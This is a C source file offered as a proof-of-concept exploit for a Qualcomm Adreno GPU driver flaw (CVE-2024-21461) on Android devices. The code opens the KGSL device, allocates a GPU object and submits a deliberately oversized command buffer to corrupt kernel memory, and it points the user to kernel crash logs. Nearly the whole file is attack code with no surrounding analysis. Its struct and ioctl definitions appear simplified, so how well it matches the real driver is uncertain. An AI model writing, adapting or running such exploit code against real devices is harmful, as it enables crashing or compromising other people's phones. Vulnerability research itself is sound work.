#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>

// Qualcomm KGSL (Kernel Graphics Support Layer) IOCTLs
#define KGSL_IOC_GPUOBJ_ALLOC _IOWR(0x09, 0x2E, struct kgsl_gpuobj_alloc)
#define KGSL_IOC_GPU_COMMAND  _IOWR(0x09, 0x2B, struct kgsl_gpu_command)

struct kgsl_gpuobj_alloc {
    unsigned long long size;
    unsigned int flags;
    unsigned int id;
    unsigned long long va;
};

struct kgsl_gpu_command {
    unsigned int flags;
    unsigned int gpuaddr;
    unsigned int size;
    unsigned int context_id;
};

/**
 * CVE-2024-21461: Adreno GPU LPE
 * Targets: Android devices with Qualcomm Snapdragon processors.
 * Exploit: Memory corruption in KGSL when processing malformed GPU commands
 * that reference invalid memory objects.
 */

int main(int argc, char *argv[]) {
    printf("[*] CVE-2024-21461: Adreno GPU Exploit POC\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) {
        perror("[-] Failed to open /dev/kgsl-3d0");
        return 1;
    }

    printf("[+] KGSL driver opened successfully.\n");

    // 1. Allocate a GPU object
    struct kgsl_gpuobj_alloc alloc = {
        .size = 0x1000,
        .flags = 0x1 // Default allocation
    };

    if (ioctl(fd, KGSL_IOC_GPUOBJ_ALLOC, &alloc) < 0) {
        perror("[-] KGSL_IOC_GPUOBJ_ALLOC failed");
        close(fd);
        return 1;
    }
    printf("[*] Allocated GPU object ID: %d at VA: 0x%llx\n", alloc.id, alloc.va);

    // 2. Submit a malformed command buffer to trigger memory corruption
    // This is the core trigger for the CVE-2024-21461 bug
    struct kgsl_gpu_command cmd = {
        .gpuaddr = alloc.va,
        .size = 0xFFFFFFFF, // Maliciously large size to trigger overflow/corruption
        .context_id = 0
    };

    printf("[*] Submitting malformed GPU command buffer...\n");
    if (ioctl(fd, KGSL_IOC_GPU_COMMAND, &cmd) < 0) {
        // This might fail if the kernel catches it, but the vulnerability 
        // lies in how the driver processes this before returning.
        perror("[!] KGSL_IOC_GPU_COMMAND returned error (this is often expected)");
    }

    printf("[+] Exploit sequence finished. Check kernel logs for Adreno-related crashes.\n");

    close(fd);
    return 0;
}

